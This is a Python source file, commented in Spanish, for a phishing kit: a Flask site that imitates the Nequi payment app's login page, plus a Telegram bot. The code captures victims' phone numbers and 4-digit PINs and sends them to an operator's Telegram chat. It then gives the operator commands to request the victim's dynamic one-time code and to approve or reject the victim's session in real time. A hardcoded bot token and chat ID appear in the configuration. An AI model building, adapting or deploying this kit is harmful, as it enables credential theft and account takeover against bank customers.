# ========================================
# SERVIDOR WEB + BOT DE TELEGRAM
# ========================================

from flask import Flask, render_template_string, request, jsonify, session
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, ContextTypes, filters
import asyncio
import threading
from datetime import datetime
import secrets

app = Flask(__name__)
app.secret_key = secrets.token_hex(16)

# ========================================
# CONFIGURACIÓN - CAMBIA ESTOS VALORES
# ========================================
BOT_TOKEN = "8387679229:AAEPfB79Soov3uLZTyv3Lq9rbifJxeoJcwc"
ADMIN_CHAT_ID = "8469651553"  # Tu ID de Telegram

# Base de datos temporal en memoria
usuarios_activos = {}
bot_app = None

# ========================================
# PÁGINA WEB HTML
# ========================================
HTML_LOGIN = """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nequi - Iniciar Sesión</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Red Hat Display', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
        }
        body {
            background: linear-gradient(135deg, #8B5CF6 0%, #EC4899 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 24px;
            padding: 40px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        .logo {
            text-align: center;
            margin-bottom: 32px;
        }
        .logo h1 {
            color: #8B5CF6;
            font-size: 48px;
            font-weight: 800;
        }
        .form-group {
            margin-bottom: 24px;
        }
        label {
            display: block;
            color: #210049;
            font-weight: 600;
            margin-bottom: 8px;
            font-size: 14px;
        }
        input {
            width: 100%;
            padding: 16px;
            border: 2px solid #E5E7EB;
            border-radius: 12px;
            font-size: 16px;
            transition: all 0.3s;
        }
        input:focus {
            outline: none;
            border-color: #8B5CF6;
            box-shadow: 0 0 0 4px rgba(139, 92, 246, 0.1);
        }
        .btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #8B5CF6 0%, #EC4899 100%);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: transform 0.2s;
        }
        .btn:hover {
            transform: translateY(-2px);
        }
        .btn:active {
            transform: translateY(0);
        }
        .mensaje {
            padding: 16px;
            border-radius: 12px;
            margin-bottom: 20px;
            text-align: center;
            font-weight: 600;
            display: none;
        }
        .error {
            background: #FEE2E2;
            color: #DC2626;
            display: block;
        }
        .loading {
            background: #DBEAFE;
            color: #2563EB;
            display: block;
        }
        .success {
            background: #D1FAE5;
            color: #059669;
            display: block;
        }
        #esperando-codigo {
            display: none;
        }
        .codigo-info {
            text-align: center;
            padding: 24px;
            background: #F3F4F6;
            border-radius: 12px;
            margin-top: 20px;
        }
        .codigo-info h3 {
            color: #8B5CF6;
            margin-bottom: 12px;
        }
        .spinner {
            border: 4px solid #F3F4F6;
            border-top: 4px solid #8B5CF6;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>Nequi</h1>
            <p style="color: #666; margin-top: 8px;">💜 Plata de una</p>
        </div>

        <div id="mensaje" class="mensaje"></div>

        <div id="login-form">
            <div class="form-group">
                <label>📱 Número de celular</label>
                <input type="tel" id="numero" placeholder="300 123 4567" maxlength="15">
            </div>
            <div class="form-group">
                <label>🔑 Clave (4 dígitos)</label>
                <input type="password" id="clave" placeholder="••••" maxlength="4">
            </div>
            <button class="btn" onclick="enviarLogin()">Entrar</button>
        </div>

        <div id="esperando-codigo">
            <div class="codigo-info">
                <h3>⏳ Verificando tu identidad</h3>
                <div class="spinner"></div>
                <p style="color: #666; margin-top: 16px;">
                    Ingresa el código dinámico que te solicitaremos en un momento...
                </p>
            </div>
        </div>
    </div>

    <script>
        let sessionId = '';
        let checkInterval;

        async function enviarLogin() {
            const numero = document.getElementById('numero').value;
            const clave = document.getElementById('clave').value;
            const mensaje = document.getElementById('mensaje');

            if (!numero || !clave) {
                mensaje.className = 'mensaje error';
                mensaje.textContent = '❌ Por favor completa todos los campos';
                return;
            }

            if (clave.length !== 4 || !/^\d+$/.test(clave)) {
                mensaje.className = 'mensaje error';
                mensaje.textContent = '❌ La clave debe tener 4 dígitos';
                return;
            }

            mensaje.className = 'mensaje loading';
            mensaje.textContent = '⏳ Verificando credenciales...';

            try {
                const response = await fetch('/login', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({numero, clave})
                });

                const data = await response.json();
                
                if (data.success) {
                    sessionId = data.session_id;
                    document.getElementById('login-form').style.display = 'none';
                    document.getElementById('esperando-codigo').style.display = 'block';
                    mensaje.className = 'mensaje success';
                    mensaje.textContent = '✅ Credenciales verificadas';
                    
                    // Revisar estado cada 2 segundos
                    checkInterval = setInterval(checkStatus, 2000);
                } else {
                    mensaje.className = 'mensaje error';
                    mensaje.textContent = data.message;
                }
            } catch (error) {
                mensaje.className = 'mensaje error';
                mensaje.textContent = '❌ Error de conexión';
            }
        }

        async function checkStatus() {
            try {
                const response = await fetch('/check_status?session=' + sessionId);
                const data = await response.json();
                
                if (data.status === 'aprobado') {
                    clearInterval(checkInterval);
                    document.getElementById('mensaje').className = 'mensaje success';
                    document.getElementById('mensaje').textContent = '✅ ¡Acceso exitoso! Redirigiendo...';
                    setTimeout(() => {
                        window.location.href = '/exito';
                    }, 2000);
                } else if (data.status === 'rechazado') {
                    clearInterval(checkInterval);
                    document.getElementById('mensaje').className = 'mensaje error';
                    document.getElementById('mensaje').textContent = '❌ ' + data.message;
                    setTimeout(() => location.reload(), 3000);
                }
            } catch (error) {
                console.error('Error checking status:', error);
            }
        }
    </script>
</body>
</html>
"""

HTML_EXITO = """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Acceso Exitoso - Nequi</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            font-family: 'Red Hat Display', sans-serif;
        }
        body {
            background: linear-gradient(135deg, #8B5CF6 0%, #EC4899 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            background: white;
            border-radius: 24px;
            padding: 60px 40px;
            text-align: center;
            max-width: 400px;
        }
        .checkmark {
            font-size: 80px;
            color: #10B981;
            margin-bottom: 20px;
        }
        h1 {
            color: #8B5CF6;
            margin-bottom: 16px;
        }
        p {
            color: #666;
            font-size: 18px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="checkmark">✅</div>
        <h1>¡Acceso Exitoso!</h1>
        <p>Has ingresado correctamente a Nequi</p>
        <p style="margin-top: 20px; color: #8B5CF6; font-weight: 600;">💜 Gracias por usar Nequi</p>
    </div>
</body>
</html>
"""

# ========================================
# RUTAS DE LA PÁGINA WEB
# ========================================
@app.route('/')
def index():
    return render_template_string(HTML_LOGIN)

@app.route('/login', methods=['POST'])
async def login():
    data = request.json
    numero = data.get('numero')
    clave = data.get('clave')
    
    # Generar ID de sesión único
    session_id = secrets.token_hex(8)
    
    # Guardar datos del usuario
    usuarios_activos[session_id] = {
        'numero': numero,
        'clave': clave,
        'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'status': 'esperando',
        'codigo_dinamico': None
    }
    
    # Enviar notificación al admin por Telegram
    await enviar_notificacion_admin(session_id, numero, clave)
    
    return jsonify({'success': True, 'session_id': session_id})

@app.route('/check_status')
def check_status():
    session_id = request.args.get('session')
    
    if session_id in usuarios_activos:
        user_data = usuarios_activos[session_id]
        return jsonify({
            'status': user_data['status'],
            'message': user_data.get('message', '')
        })
    
    return jsonify({'status': 'error', 'message': 'Sesión no encontrada'})

@app.route('/exito')
def exito():
    return render_template_string(HTML_EXITO)

# ========================================
# BOT DE TELEGRAM
# ========================================
async def enviar_notificacion_admin(session_id, numero, clave):
    """Envía notificación al admin cuando alguien ingresa datos"""
    mensaje = (
        f"🚨 NUEVO LOGIN DETECTADO\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📱 Número: {numero}\n"
        f"🔑 Clave: {clave}\n"
        f"🆔 Sesión: {session_id}\n"
        f"⏰ {datetime.now().strftime('%H:%M:%S')}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Usa estos comandos:\n"
        f"/pedir {session_id}\n"
        f"/aprobar {session_id}\n"
        f"/rechazar {session_id}"
    )
    
    try:
        await bot_app.bot.send_message(chat_id=ADMIN_CHAT_ID, text=mensaje)
    except Exception as e:
        print(f"Error enviando mensaje: {e}")

async def cmd_pedir(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comando /pedir SESSION_ID - Pide el código dinámico"""
    if str(update.effective_user.id) != ADMIN_CHAT_ID:
        await update.message.reply_text("❌ No autorizado")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Uso: /pedir SESSION_ID")
        return
    
    session_id = context.args[0]
    
    if session_id not in usuarios_activos:
        await update.message.reply_text("❌ Sesión no encontrada")
        return
    
    usuarios_activos[session_id]['status'] = 'pidiendo_codigo'
    
    await update.message.reply_text(
        f"✅ Ahora el usuario verá: 'Ingresa tu código dinámico'\n\n"
        f"Espera a que ingrese el código y te llegará aquí.\n"
        f"Sesión: {session_id}"
    )

async def cmd_aprobar(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comando /aprobar SESSION_ID - Aprueba el acceso"""
    if str(update.effective_user.id) != ADMIN_CHAT_ID:
        await update.message.reply_text("❌ No autorizado")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Uso: /aprobar SESSION_ID")
        return
    
    session_id = context.args[0]
    
    if session_id not in usuarios_activos:
        await update.message.reply_text("❌ Sesión no encontrada")
        return
    
    usuarios_activos[session_id]['status'] = 'aprobado'
    
    await update.message.reply_text(f"✅ Sesión {session_id} APROBADA\nEl usuario verá 'Acceso exitoso'")

async def cmd_rechazar(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comando /rechazar SESSION_ID - Rechaza el acceso"""
    if str(update.effective_user.id) != ADMIN_CHAT_ID:
        await update.message.reply_text("❌ No autorizado")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Uso: /rechazar SESSION_ID")
        return
    
    session_id = context.args[0]
    
    if session_id not in usuarios_activos:
        await update.message.reply_text("❌ Sesión no encontrada")
        return
    
    usuarios_activos[session_id]['status'] = 'rechazado'
    usuarios_activos[session_id]['message'] = 'Credenciales incorrectas'
    
    await update.message.reply_text(f"❌ Sesión {session_id} RECHAZADA\nEl usuario verá error")

async def cmd_lista(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comando /lista - Muestra todas las sesiones activas"""
    if str(update.effective_user.id) != ADMIN_CHAT_ID:
        await update.message.reply_text("❌ No autorizado")
        return
    
    if not usuarios_activos:
        await update.message.reply_text("📝 No hay sesiones activas")
        return
    
    mensaje = "📝 SESIONES ACTIVAS:\n━━━━━━━━━━━━━━━━━━━━\n\n"
    
    for session_id, data in usuarios_activos.items():
        mensaje += (
            f"🆔 {session_id}\n"
            f"📱 {data['numero']}\n"
            f"🔑 {data['clave']}\n"
            f"📊 Estado: {data['status']}\n"
            f"⏰ {data['timestamp']}\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
        )
    
    await update.message.reply_text(mensaje)

async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comando /help - Muestra ayuda"""
    mensaje = (
        "🤖 COMANDOS DISPONIBLES:\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "/lista - Ver sesiones activas\n"
        "/pedir SESSION_ID - Pedir código dinámico\n"
        "/aprobar SESSION_ID - Aprobar acceso\n"
        "/rechazar SESSION_ID - Rechazar acceso\n"
        "/help - Ver esta ayuda"
    )
    await update.message.reply_text(mensaje)

# ========================================
# INICIALIZACIÓN
# ========================================
def run_bot():
    """Ejecuta el bot de Telegram en un thread separado"""
    global bot_app
    bot_app = Application.builder().token(BOT_TOKEN).build()
    
    bot_app.add_handler(CommandHandler("pedir", cmd_pedir))
    bot_app.add_handler(CommandHandler("aprobar", cmd_aprobar))
    bot_app.add_handler(CommandHandler("rechazar", cmd_rechazar))
    bot_app.add_handler(CommandHandler("lista", cmd_lista))
    bot_app.add_handler(CommandHandler("help", cmd_help))
    
    print("🤖 Bot de Telegram iniciado")
    bot_app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    # Iniciar bot en thread separado
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    print("=" * 50)
    print("🌐 SERVIDOR WEB INICIADO")
    print("=" * 50)
    print("📱 Abre: http://localhost:5000")
    print("🤖 Bot de Telegram activo")
    print("=" * 50)
    
    # Iniciar servidor web
    app.run(host='0.0.0.0', port=5000, debug=False)
